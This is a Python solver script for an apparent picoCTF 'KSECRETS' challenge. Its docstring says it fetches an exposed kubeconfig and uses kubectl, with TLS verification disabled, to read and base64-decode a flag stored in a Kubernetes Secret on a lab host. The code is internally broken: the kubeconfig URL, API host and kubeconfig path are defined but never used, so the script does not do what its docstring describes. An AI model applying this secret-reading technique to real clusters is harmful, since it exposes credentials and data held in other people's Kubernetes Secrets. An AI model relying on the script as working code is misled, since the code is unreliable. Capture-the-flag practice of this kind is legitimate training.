#!/usr/bin/env python3
"""Solver for Challenge 732: KSECRETS (General Skills, picoCTF 2026).

Provisioned k3s exposes its API + kubeconfig over HTTP. The flag lives in
an Opaque Secret (academy/ctf-secret) as base64. Fetch kubeconfig, point
kubectl at the cluster API, read the secret, base64-decode the flag.
"""
import base64
import subprocess
import sys
import urllib.request

KUBECONFIG_URL = sys.argv[1] if len(sys.argv) > 1 else ""
API_HOST = "chatelaine.cylabacademy.net:26907"
KUBECTL = "/tmp/kubectl"


def run(*args):
    return subprocess.run(
        [KUBECTL, "--insecure-skip-tls-verify=true", *args],
        capture_output=True, text=True, timeout=60,
    )


def solve(kubeconfig_path="/tmp/kube732b"):
    out = run("-n", "academy", "get", "secret", "ctf-secret",
              "-o", "jsonpath={.data.flag}")
    if out.returncode != 0:
        raise RuntimeError(f"kubectl failed: {out.stderr[:300]}")
    return base64.b64decode(out.stdout.strip()).decode().strip()


if __name__ == "__main__":
    print(solve())
